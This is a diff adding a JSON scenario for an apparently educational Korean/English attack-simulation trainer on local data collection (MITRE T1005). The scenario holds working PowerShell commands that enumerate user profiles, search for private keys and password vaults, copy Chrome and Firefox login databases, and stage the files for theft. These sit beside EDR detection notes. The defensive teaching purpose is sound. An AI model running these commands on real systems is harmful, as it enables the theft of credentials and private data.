@@ -1,0 +1,147 @@
+{
+  "id": "T1005",
+  "title": "로컬 시스템 데이터 수집 시뮬레이션",
+  "titleEn": "Data from Local System Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "탐색", "labelEn": "Discovery" },
+    { "label": "수집", "labelEn": "Collection" },
+    { "label": "추출", "labelEn": "Extraction" },
+    { "label": "완료", "labelEn": "Complete" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker", "type": "attacker" },
+    { "id": "target", "label": "Compromised PC", "type": "victim" },
+    { "id": "staging", "label": "Staging Folder", "type": "server" },
+    { "id": "edr", "label": "EDR Agent", "type": "defense" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "target", "label": "Remote Access", "activeStep": 0 },
+    { "from": "target", "to": "staging", "label": "File Copy", "activeStep": 2 },
+    { "from": "edr", "to": "target", "label": "File Audit", "activeStep": 1 },
+    { "from": "staging", "to": "attacker", "label": "Exfil Ready", "activeStep": 3 }
+  ],
+  "desktopIcons": [
+    { "label": "PowerShell", "icon": "💻" },
+    { "label": "File Explorer", "icon": "📂" },
+    { "label": "Browser DB", "icon": "🔑" }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n$drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{N='Free(GB)';E={[math]::Round($_.Free/1GB,2)}}, @{N='Used(GB)';E={[math]::Round($_.Used/1GB,2)}};\n$userDirs = Get-ChildItem C:\\Users -Directory | Select-Object Name, LastWriteTime;\nWrite-Host '=== Drive Info ===';\n$drives | Format-Table -AutoSize;\nWrite-Host '=== User Profiles ===';\n$userDirs | Format-Table -AutoSize\"",
+      "out": "=== Drive Info ===\nName Free(GB) Used(GB)\n---- -------- --------\nC       45.23   204.77\nD      180.50    69.50\n\n=== User Profiles ===\nName         LastWriteTime\n----         -------------\nAdministrator 2026-01-15 08:30:00\n{userName}    2026-03-01 09:15:00\nPublic        2026-01-01 00:00:00\nsvc_backup    2026-02-28 22:00:00",
+      "def": "[EDR] System enumeration - drive and user profile discovery",
+      "defAction": "Process: powershell.exe\nAction: Get-PSDrive + Get-ChildItem C:\\Users\nData: Drive capacity, user profiles list\nPattern: Pre-collection reconnaissance\nRisk: MEDIUM",
+      "desc": "공격자가 시스템의 드라이브 정보와 사용자 프로필 목록을 수집하여 어디에 가치 있는 데이터가 있는지 파악합니다.",
+      "descEn": "The attacker enumerates drive info and user profiles to identify where valuable data may reside.",
+      "stepTitle": "시스템 탐색",
+      "stepTitleEn": "System Enumeration",
+      "feynman": "도둑이 집에 들어와서 먼저 방이 몇 개인지, 어떤 가족이 사는지 둘러보는 것과 같습니다. 어디를 뒤져야 할지 파악하는 단계입니다.",
+      "feynmanEn": "It's like a burglar first checking how many rooms there are and who lives in the house before deciding where to search.",
+      "expert": "Get-PSDrive와 Get-ChildItem으로 파일 시스템 구조를 파악합니다. 이는 MITRE ATT&CK T1083 (File and Directory Discovery)에도 해당합니다. Sysmon Event ID 1에서 이 명령 조합을 탐지할 수 있습니다.",
+      "expertEn": "Get-PSDrive and Get-ChildItem map the file system structure. This also maps to MITRE ATT&CK T1083 (File and Directory Discovery). Detectable via Sysmon Event ID 1.",
+      "defTooltip": "비관리자 계정에서 전체 드라이브 열거와 다른 사용자 프로필 접근이 동시에 발생하면 의심해야 합니다.",
+      "defTooltipEn": "When non-admin accounts enumerate all drives and access other user profiles simultaneously, this should be flagged.",
+      "hackerLog": {
+        "title": "시스템 탐색",
+        "lines": [
+          { "text": "C: 204.77GB used, D: 69.50GB used", "desc": "데이터가 주로 C드라이브에 집중" },
+          { "text": "User profiles: Administrator, {userName}, svc_backup", "desc": "타겟 사용자 프로필 식별" }
+        ]
+      },
+      "terms": [
+        { "term": "File System Enumeration", "desc": "파일 시스템 구조를 탐색하여 드라이브, 폴더, 파일 목록을 수집하는 행위" },
+        { "term": "User Profile", "desc": "Windows에서 각 사용자의 설정, 문서, 데이터가 저장되는 폴더 (C:\\Users\\username)" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n$results = @();\n$extensions = @('*.docx','*.xlsx','*.pdf','*.pptx','*.pem','*.key','*.pfx','*.kdbx');\nforeach($ext in $extensions) {\n  $files = Get-ChildItem -Path C:\\Users -Recurse -Include $ext -ErrorAction SilentlyContinue;\n  foreach($f in $files) {\n    $results += [PSCustomObject]@{Name=$f.Name; Path=$f.FullName; Size=[math]::Round($f.Length/1KB,1); Modified=$f.LastWriteTime};\n  }\n}\n$results | Sort-Object Size -Descending | Select-Object -First 10 | Format-Table -AutoSize\"",
+      "out": "Name                              Path                                                    Size Modified\n----                              ----                                                    ---- --------\n2026_전략보고서.xlsx               C:\\Users\\{userName}\\Documents\\2026_전략보고서.xlsx        2458.3 2026-02-28\n고객_DB_백업.xlsx                  C:\\Users\\{userName}\\Desktop\\고객_DB_백업.xlsx             1847.2 2026-02-25\nVPN_인증서.pfx                     C:\\Users\\svc_backup\\Documents\\VPN_인증서.pfx              125.8 2026-01-20\nSSH_private.key                   C:\\Users\\{userName}\\.ssh\\SSH_private.key                    3.2 2026-02-15\npassword_vault.kdbx               C:\\Users\\{userName}\\Documents\\password_vault.kdbx          48.7 2026-02-20\n분기별_실적.pptx                   C:\\Users\\{userName}\\Documents\\분기별_실적.pptx            890.5 2026-02-27\nserver_cert.pem                   C:\\Users\\svc_backup\\.ssh\\server_cert.pem                    4.1 2026-01-15",
+      "def": "[EDR] Bulk file search across user directories - sensitive file types targeted",
+      "defAction": "Process: powershell.exe\nAction: Recursive search for .docx,.xlsx,.pdf,.pem,.key,.pfx,.kdbx\nScope: C:\\Users (all profiles)\nFiles Found: 7 sensitive files\nRisk: HIGH",
+      "desc": "민감한 확장자를 가진 파일을 모든 사용자 폴더에서 재귀적으로 검색합니다. 문서, 인증서, 비밀번호 저장소가 발견됩니다.",
+      "descEn": "Recursively searches all user folders for files with sensitive extensions. Documents, certificates, and password vaults are found.",
+      "stepTitle": "민감 파일 검색",
+      "stepTitleEn": "Sensitive File Search",
+      "feynman": "도둑이 모든 서랍을 열면서 현금, 보석, 중요 서류를 찾는 것과 같습니다. 특정 종류의 물건만 골라서 찾습니다.",
+      "feynmanEn": "It's like a burglar opening every drawer looking specifically for cash, jewelry, and important documents.",
+      "expert": "재귀적 파일 검색에서 .pem, .key, .pfx, .kdbx 확장자를 포함하는 것은 인증서, 개인키, KeePass 데이터베이스를 타겟팅합니다. EDR에서 단일 프로세스의 대량 파일 열거를 탐지해야 합니다.",
+      "expertEn": "Including .pem, .key, .pfx, .kdbx in recursive file searches targets certificates, private keys, and KeePass databases. EDR should detect bulk file enumeration by a single process.",
+      "defTooltip": "단일 프로세스가 짧은 시간 내에 여러 사용자 폴더를 재귀적으로 검색하는 패턴을 EDR에서 탐지하세요.",
+      "defTooltipEn": "Detect EDR patterns where a single process recursively searches multiple user folders within a short timeframe.",
+      "hackerLog": {
+        "title": "민감 파일 발견",
+        "lines": [
+          { "text": "VPN_인증서.pfx, SSH_private.key", "desc": "네트워크 접근용 인증서/키 발견" },
+          { "text": "password_vault.kdbx", "desc": "비밀번호 저장소 발견 - 전체 인증정보 획득 가능" }
+        ]
+      },
+      "terms": [
+        { "term": "KeePass Database (.kdbx)", "desc": "비밀번호 관리 프로그램의 암호화된 데이터베이스 파일" },
+        { "term": "PFX/PEM Certificate", "desc": "디지털 인증서 파일 형식 - 개인키를 포함할 수 있어 유출 시 위험" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Browser credential extraction\n$chromeLoginDB = 'C:\\Users\\{userName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data';\n$firefoxProfile = Get-ChildItem 'C:\\Users\\{userName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\' -Directory | Select-Object -First 1;\nCopy-Item $chromeLoginDB -Destination 'C:\\Windows\\Temp\\chrome_logins.db' -Force;\nCopy-Item \\\"$($firefoxProfile.FullName)\\logins.json\\\" -Destination 'C:\\Windows\\Temp\\ff_logins.json' -Force;\nWrite-Host 'Browser credential files copied to staging';\nGet-ChildItem C:\\Windows\\Temp\\*logins* | Format-Table Name, Length, LastWriteTime -AutoSize\"",
+      "out": "Browser credential files copied to staging\nName              Length LastWriteTime\n----              ------ -------------\nchrome_logins.db  98304  2026-03-01 14:02:30\nff_logins.json    15872  2026-03-01 14:02:30",
+      "def": "[EDR] Browser credential database access and copy detected",
+      "defAction": "Process: powershell.exe\nAction: Copy-Item from Chrome Login Data + Firefox logins.json\nSource: Browser profile directories\nDestination: C:\\Windows\\Temp (staging)\nRisk: CRITICAL",
+      "desc": "Chrome과 Firefox의 로그인 데이터베이스를 스테이징 폴더로 복사합니다. 이 파일에는 저장된 웹사이트 비밀번호가 포함됩니다.",
+      "descEn": "Copies Chrome and Firefox login databases to a staging folder. These files contain saved website passwords.",
+      "stepTitle": "브라우저 인증정보 추출",
+      "stepTitleEn": "Extract Browser Credentials",
+      "feynman": "집 주인이 비밀번호를 적어둔 수첩을 찾아서 복사하는 것과 같습니다. 이 수첩에는 은행, 이메일, 회사 시스템의 비밀번호가 모두 적혀 있습니다.",
+      "feynmanEn": "It's like finding and copying the homeowner's notebook where they wrote down all their passwords for banking, email, and work systems.",
+      "expert": "Chrome의 Login Data는 SQLite DB이며 DPAPI로 암호화됩니다. Mimikatz 등으로 DPAPI 마스터키를 추출하면 복호화 가능합니다. Firefox의 logins.json은 NSS 라이브러리로 복호화합니다. 이 파일들의 복사를 EDR에서 반드시 탐지해야 합니다.",
+      "expertEn": "Chrome's Login Data is a SQLite DB encrypted with DPAPI. DPAPI master keys extracted via Mimikatz allow decryption. Firefox's logins.json is decrypted with NSS library. EDR must detect copies of these files.",
+      "defTooltip": "브라우저 프로필 경로의 Login Data, logins.json 파일에 대한 복사 작업을 EDR에서 모니터링하세요.",
+      "defTooltipEn": "Monitor EDR for copy operations on Login Data and logins.json files in browser profile paths.",
+      "hackerLog": {
+        "title": "브라우저 인증정보 추출",
+        "lines": [
+          { "text": "chrome_logins.db → C:\\Windows\\Temp", "desc": "Chrome 저장 비밀번호 DB 복사" },
+          { "text": "ff_logins.json → C:\\Windows\\Temp", "desc": "Firefox 저장 비밀번호 파일 복사" }
+        ]
+      },
+      "terms": [
+        { "term": "DPAPI (Data Protection API)", "desc": "Windows의 데이터 암호화 API - Chrome이 비밀번호를 암호화하는 데 사용" },
+        { "term": "Credential Dumping", "desc": "시스템에 저장된 인증 정보를 추출하는 공격 기법" }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Collect sensitive files to staging directory\n$stage = 'C:\\Windows\\Temp\\collect_' + (Get-Date -Format 'yyyyMMdd');\nNew-Item -ItemType Directory -Path $stage -Force | Out-Null;\n$targets = @(\n  'C:\\Users\\{userName}\\Documents\\2026_전략보고서.xlsx',\n  'C:\\Users\\{userName}\\Desktop\\고객_DB_백업.xlsx',\n  'C:\\Users\\svc_backup\\Documents\\VPN_인증서.pfx',\n  'C:\\Users\\{userName}\\.ssh\\SSH_private.key',\n  'C:\\Users\\{userName}\\Documents\\password_vault.kdbx'\n);\nforeach($t in $targets) { Copy-Item $t -Destination $stage -Force; };\nWrite-Host \\\"Files staged at: $stage\\\";\nGet-ChildItem $stage | Format-Table Name, @{N='KB';E={[math]::Round($_.Length/1KB,1)}} -AutoSize\"",
+      "out": "Files staged at: C:\\Windows\\Temp\\collect_20260301\nName                          KB\n----                          --\n2026_전략보고서.xlsx           2458.3\n고객_DB_백업.xlsx              1847.2\nVPN_인증서.pfx                  125.8\nSSH_private.key                   3.2\npassword_vault.kdbx              48.7\nchrome_logins.db                 96.0\nff_logins.json                   15.5",
+      "def": "[EDR] File staging detected - multiple sensitive files copied to temp directory",
+      "defAction": "Process: powershell.exe\nAction: Bulk file copy to C:\\Windows\\Temp\\collect_20260301\nFiles: 7 sensitive files (strategy docs, certs, keys, credentials)\nTotal Size: 4,594.7 KB\nRisk: CRITICAL\nAction: Host isolation recommended",
+      "desc": "식별된 민감 파일들을 하나의 스테이징 폴더로 모읍니다. 유출 전 데이터를 한 곳에 모으는 전형적인 패턴입니다.",
+      "descEn": "Collects identified sensitive files into a single staging folder. This is a typical pattern of aggregating data before exfiltration.",
+      "stepTitle": "데이터 스테이징",
+      "stepTitleEn": "Data Staging",
+      "feynman": "도둑이 집안 곳곳에서 훔칠 물건들을 현관 앞에 모아두는 것과 같습니다. 한 번에 가져가기 위해 먼저 한 곳에 모읍니다.",
+      "feynmanEn": "It's like a burglar gathering stolen items from around the house near the front door, ready to carry everything out at once.",
+      "expert": "C:\\Windows\\Temp는 모든 사용자가 쓸 수 있어 스테이징에 자주 사용됩니다. 민감 파일의 대량 복사 + 임시 폴더 생성 패턴을 상관분석하면 Collection 단계를 탐지할 수 있습니다. 이후 T1560 (Archive Collected Data)으로 이어질 가능성이 높습니다.",
+      "expertEn": "C:\\Windows\\Temp is writable by all users, making it a common staging location. Correlating bulk sensitive file copies + temp folder creation detects the Collection stage. Likely followed by T1560 (Archive Collected Data).",
+      "defTooltip": "임시 폴더에 민감 파일이 대량으로 복사되는 패턴을 EDR에서 모니터링하세요. 특히 서로 다른 사용자 폴더에서 같은 위치로의 복사가 핵심입니다.",
+      "defTooltipEn": "Monitor EDR for bulk copies of sensitive files to temp folders. Files copied from different user directories to the same location is a key indicator.",
+      "hackerLog": {
+        "title": "데이터 스테이징",
+        "lines": [
+          { "text": "C:\\Windows\\Temp\\collect_20260301", "desc": "스테이징 폴더 생성" },
+          { "text": "7 files, 4,594.7 KB total", "desc": "전략문서, 인증서, 비밀번호 DB 모두 수집 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Data Staging", "desc": "유출 전 수집된 데이터를 한 곳에 모아두는 공격 단계" },
+        { "term": "T1074 (Data Staged)", "desc": "MITRE ATT&CK - 유출 전 데이터를 중앙 위치에 수집하는 기법" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (Collection)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Get-PSDrive / Get-ChildItem (enum)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "Get-ChildItem -Recurse (file search)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "Copy-Item (browser DB)", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "Copy-Item (staging)", "depth": 2, "alert": true, "minStep": 3 }
+  ]
+}
